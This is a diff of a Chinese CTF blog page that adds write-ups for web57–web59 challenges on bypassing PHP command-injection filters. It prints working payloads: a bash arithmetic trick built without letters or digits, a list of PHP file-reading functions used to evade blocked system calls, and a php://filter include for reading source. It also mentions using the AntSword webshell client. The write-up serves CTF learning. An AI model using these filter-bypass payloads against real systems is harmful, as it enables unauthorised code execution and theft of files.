@@ -485,21 +485,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-26
+                    2022-12-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.7k
+                    6.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    24 分
+                    26 分
                 </div>
                 
 
@@ -911,6 +911,40 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 <p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p>
 </blockquote>
 <p>注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这里的字母和数字都被过滤了，题目说传入一个36，就可以得到flag。<br><img src="https://img-blog.csdnimg.cn/cbc6e031f9034562a1fac4c51868d50f.png" alt="57">那应该怎么传入一个36呢？<br>因为是在shell环境下的，所以需要使用linux shell的一些特性：</p>
+<p><code>$(())</code>代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code>再对-2做一次取反得到1，所以值为1<br>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1<br>那么最后只需要37个-1相加再取反即可。<br>写个脚本生成payload：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">data &#x3D; &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;
+print(data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://img-blog.csdnimg.cn/1dfc1bd03f634f0a8ac2897860397df8.png" alt="57"><br>传参后查看源码：<br><img src="https://img-blog.csdnimg.cn/2229ad05e7d44402a9129cac3b7498bf.png" alt="57"></p>
+<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>这次是post传入一个c，不妨用蚁剑试试？</p>
+<p><img src="https://img-blog.csdnimg.cn/d4deb1dd5ef34b2e8119e315fcb326aa.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/b95d371722ed4cff845d0949b4ec7129.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/9bdfc6036b5244c089d74c881fcdf78d.png" alt="58"></p>
+<p><strong>方法二</strong><br>post传参：<br>传入<code>c=passthru(&quot;ls&quot;);``c=system(&quot;ls&quot;);</code>等，发现我试的系统命令都被过滤了。<br><img src="https://img-blog.csdnimg.cn/8067867549014691beb5f8863079e2d3.png" alt="58"><br>这里补充一些读取文件的函数的用法：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">highlight_file($filename);
+show_source($filename);
+print_r(php_strip_whitespace($filename));
+print_r(file_get_contents($filename));
+readfile($filename);
+print_r(file($filename)); &#x2F;&#x2F; var_dump
+fread(fopen($filename,&quot;r&quot;), $size);
+include($filename); &#x2F;&#x2F; 非php代码
+include_once($filename); &#x2F;&#x2F; 非php代码
+require($filename); &#x2F;&#x2F; 非php代码
+require_once($filename); &#x2F;&#x2F; 非php代码
+print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
+print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行
+fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF
+print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));
+print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记
+print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));
+print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我用一下<code>c=echo file_get_contents(&quot;flag.php&quot;);</code>，得到了flag。</p>
+<h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>同上题，但这题<code>file_get_contents</code>被过滤了，我试了一下<code>c=show_source(&quot;flag.php&quot;);</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/4f4ed1c363c54412be30562549fda20b.png" alt="59"><br>也可以使用include()文件包含:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;POST传入：
+c&#x3D;echo include($_GET[1]);
+&#x2F;&#x2F;url连接：
+&#x2F;?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>之后base64解密得到flag。</p>
 
                 
             </div>
@@ -1762,7 +1796,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">9.4k</span>&nbsp;字
+                class="white-color">9.9k</span>&nbsp;字
             
             
             
